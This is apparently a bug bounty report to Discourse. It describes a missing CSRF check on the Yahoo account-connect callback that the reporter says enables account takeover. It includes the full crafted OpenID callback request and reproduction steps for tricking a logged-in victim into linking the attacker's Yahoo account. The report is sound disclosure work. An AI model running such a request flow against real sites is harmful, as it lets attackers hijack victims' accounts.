## Vulnerability Information
Hi

There is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.

I noticed Connect Yahoo account option have the workflow with GET method and  there is lack of csrf protection on connecting yahoo account which can help attacker into inducing victim to connect attacker's yahoo account to victim's discourse account, and it leads to full account takeover of victim's account.

Vulnerable Request:

GET /auth/yahoo/callback?_method=post&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=id_res&openid.return_to=https%3A%2F%2Ftry.discourse.org%2Fauth%2Fyahoo%2Fcallback%3F_method%3Dpost&openid.claimed_id=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.identity=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.realm=https%3A%2F%2Ftry.discourse.org&openid.ns.ax=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&openid.ax.mode=fetch_response&openid.ax.value.email=testhackeroneay%40yahoo.com&openid.ax.value.fullname=test%20hackerone&openid.ax.value.nickname=test&openid.assoc_handle=abcd&openid.response_nonce=2018-10-12T16%3A27%defg-&openid.signed=assoc_handle%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2Csigned%2Cax.value.email%2Cax.type.email%2Cax.value.fullname%2Cax.type.fullname%2Cax.value.nickname%2Cax.type.nickname%2Cns.ax%2Cax.mode%2Cpape.auth_level.nist&openid.op_endpoint=https%3A%2F%2Fopen.login.yahooapis.com%2Fopenid%2Fop%2Fauth&openid.ax.type.email=http%3A%2F%2Faxschema.org%2Fcontact%2Femail&openid.ax.type.fullname=http%3A%2F%2Faxschema.org%2FnamePerson&openid.ax.type.nickname=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffriendly&openid.pape.auth_level.nist=0&openid.sig=9p%2Bxyz HTTP/1.1
Host: try.discourse.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0

Steps to reproduce:

1. Attacker go to https://try.discourse.org/u/user/preferences/account
2. Switch on burp interceptor and click on Yahoo connect.
3. Go to burp interceptor and after forwarding some requests attacker will find the upper mentioned vulnerable request.
4. Copy that and drop the request( here you saved the auth token generated by yahoo).
5. Now feed the copied request to authenticated victim (as a html form or as an url).
6. Victim get the message authentication complete and get redirected to https://try.discourse.org/?authComplete=true.
7. Attacker open his browser and try to login with yahoo.
8. Attacker get redirected to https://try.discourse.org/auth/yahoo/null
